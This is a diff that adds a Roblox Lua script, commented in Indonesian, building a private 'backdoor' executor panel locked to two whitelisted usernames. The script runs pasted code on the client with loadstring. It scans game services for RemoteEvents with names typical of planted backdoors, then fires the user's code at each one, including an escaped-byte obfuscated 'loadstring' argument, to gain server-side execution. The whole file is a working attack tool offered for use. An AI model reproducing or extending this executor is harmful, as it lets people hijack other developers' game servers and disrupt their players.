@@ -1,0 +1,167 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- SISTEM PENGUNCI PRIVATE
+local whitelist = {"manusia_hitam60", "WabilTamanAssadiq"}
+local isWhitelisted = false
+for _, name in pairs(whitelist) do if LocalPlayer.Name == name then isWhitelisted = true break end end
+if not isWhitelisted then return end
+
+if LocalPlayer then
+    local pGui = LocalPlayer:WaitForChild("PlayerGui")
+    if pGui:FindFirstChild("MANUSIA_HITAM60 BACKDOOR") then pGui["MANUSIA_HITAM60 BACKDOOR"]:Destroy() end
+
+    local ScreenGui = Instance.new("ScreenGui", pGui)
+    ScreenGui.Name = "MANUSIA_HITAM60 BACKDOOR"
+    ScreenGui.ResetOnSpawn = false
+
+    -- FRAME UTAMA (WARNA KUNING ULTIMATE SS)
+    local MainFrame = Instance.new("Frame", ScreenGui)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 0) -- KUNING
+    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+    MainFrame.Size = UDim2.new(0, 400, 0, 300)
+    MainFrame.BorderSizePixel = 0
+    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
+    MainFrame.Active = true
+    MainFrame.Draggable = true
+
+    -- TITLE (KUNING TAPI TEKS HITAM)
+    local Title = Instance.new("TextLabel", MainFrame)
+    Title.Size = UDim2.new(1, 0, 0, 45)
+    Title.Text = "  MANUSIA_HITAM60 [V14-PRIVATE]"
+    Title.BackgroundTransparency = 1
+    Title.TextColor3 = Color3.new(0,0,0)
+    Title.Font = "GothamBold"
+    Title.TextSize = 18
+    Title.TextXAlignment = "Left"
+
+    -- TEXTBOX AREA (WARNA HIJAU ULTIMATE SS)
+    local Scroll = Instance.new("ScrollingFrame", MainFrame)
+    Scroll.Position = UDim2.new(0, 12, 0, 50)
+    Scroll.Size = UDim2.new(1, -24, 0, 175)
+    Scroll.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- HIJAU
+    Scroll.BorderSizePixel = 0
+    Instance.new("UICorner", Scroll)
+    
+    local CodeBox = Instance.new("TextBox", Scroll)
+    CodeBox.Size = UDim2.new(1, -10, 1, 0)
+    CodeBox.Position = UDim2.new(0, 5, 0, 0)
+    CodeBox.Text = ""
+    CodeBox.PlaceholderText = "-- Masukkan Kode SS/Require..."
+    CodeBox.MultiLine = true
+    CodeBox.TextYAlignment = "Top"
+    CodeBox.TextXAlignment = "Left"
+    CodeBox.Font = "GothamBold" -- TEBAL
+    CodeBox.TextSize = 14
+    CodeBox.TextColor3 = Color3.new(1,1,1)
+    CodeBox.BackgroundTransparency = 1
+    CodeBox.ClearTextOnFocus = false
+
+    -- FUNGSI NOTIFIKASI KOTAK (SHARP TAGGER)
+    local function customNotify(msg, color)
+        local n = Instance.new("Frame", ScreenGui)
+        n.Size = UDim2.new(0, 300, 0, 50)
+        n.Position = UDim2.new(1, 10, 0.85, 0)
+        n.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+        n.BorderSizePixel = 2
+        n.BorderColor3 = color or Color3.fromRGB(0, 85, 255)
+        
+        local t = Instance.new("TextLabel", n)
+        t.Size = UDim2.new(1, -20, 1, 0)
+        t.Position = UDim2.new(0, 10, 0, 0)
+        t.BackgroundTransparency = 1
+        t.Text = msg
+        t.TextColor3 = Color3.new(1,1,1)
+        t.Font = "Code"
+        t.TextSize = 14
+        t.TextXAlignment = "Left"
+
+        n:TweenPosition(UDim2.new(1, -320, 0.85, 0), "Out", "Quad", 0.3, true)
+        return n, t
+    end
+
+    local BtnHolder = Instance.new("Frame", MainFrame)
+    BtnHolder.Position = UDim2.new(0, 12, 0, 235)
+    BtnHolder.Size = UDim2.new(1, -24, 0, 50)
+    BtnHolder.BackgroundTransparency = 1
+    local Layout = Instance.new("UIGridLayout", BtnHolder)
+    Layout.CellSize = UDim2.new(0, 88, 0, 45)
+    Layout.CellPadding = UDim2.new(0, 8, 0, 0)
+
+    -- TOMBOL-TOMBOL (WARNA BIRU ULTIMATE SS)
+    local function createBtn(txt, clr, fn)
+        local b = Instance.new("TextButton", BtnHolder)
+        b.Text = txt
+        b.BackgroundColor3 = clr -- BIRU
+        b.TextColor3 = Color3.new(1,1,1)
+        b.Font = "GothamBold"
+        b.TextSize = 12
+        Instance.new("UICorner", b)
+        b.MouseButton1Click:Connect(function() fn(b) end)
+    end
+
+    local blueColor = Color3.fromRGB(0, 85, 255) -- BIRU ULTIMATE SS
+
+    createBtn("CLEAR", blueColor, function() CodeBox.Text = "" end)
+    createBtn("CS EXEC", blueColor, function() 
+        local f = loadstring(CodeBox.Text)
+        if f then f() end
+    end)
+
+    local foundRemotes = {}
+
+    createBtn("SS EXEC", blueColor, function()
+        if #foundRemotes > 0 then
+            local code = CodeBox.Text
+            local nf, nt = customNotify("Menyiapkan...", blueColor)
+            
+            task.spawn(function()
+                for i, remote in pairs(foundRemotes) do
+                    nt.Text = "Menembakkan kode ke backdoor " .. i .. " dari " .. #foundRemotes
+                    pcall(function()
+                        remote:FireServer(code)
+                        remote:FireServer("", code)
+                        remote:FireServer(nil, code)
+                        remote:FireServer("\108\111\97\100\115\116\114\105\110\103", code)
+                    end)
+                    task.wait(0.05)
+                end
+                nt.Text = "Selesai! " .. #foundRemotes .. " Backdoor ditembak."
+                task.wait(2)
+                nf:TweenPosition(UDim2.new(1, 10, 0.85, 0), "In", "Quad", 0.3, true)
+                task.wait(0.4) nf:Destroy()
+            end)
+        else 
+            local nf, nt = customNotify("SCAN DULU, BIL!", Color3.new(1,0,0))
+            task.delay(2, function() nf:Destroy() end)
+        end
+    end)
+
+    createBtn("SCAN", blueColor, function(self)
+        foundRemotes = {}
+        local names = {"MainEvent", "Control", "Handshake", "Remote", "v", "_", "Check", "Request", "ServerEvent", "MainRemote", "RemoteEvent", "RequestEvent"}
+        local paths = {game:GetService("ReplicatedStorage"), game:GetService("JointsService"), game:GetService("Workspace")}
+        
+        local nf, nt = customNotify("Memindai...", Color3.new(1,1,1))
+        
+        for _, path in pairs(paths) do
+            for _, v in pairs(path:GetDescendants()) do
+                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+                    for _, n in pairs(names) do
+                        if v.Name:lower():find(n:lower()) then
+                            table.insert(foundRemotes, v)
+                            break
+                        end
+                    end
+                end
+            end
+        end
+
+        if #foundRemotes > 0 then
+            nt.Text = "Berhasil! Ditemukan " .. #foundRemotes .. " backdoor."
+        else 
+            nt.Text = "Gagal menemukan backdoor."
+        end
+        task.delay(3, function() if nf then nf:Destroy() end end)
+    end)
+end
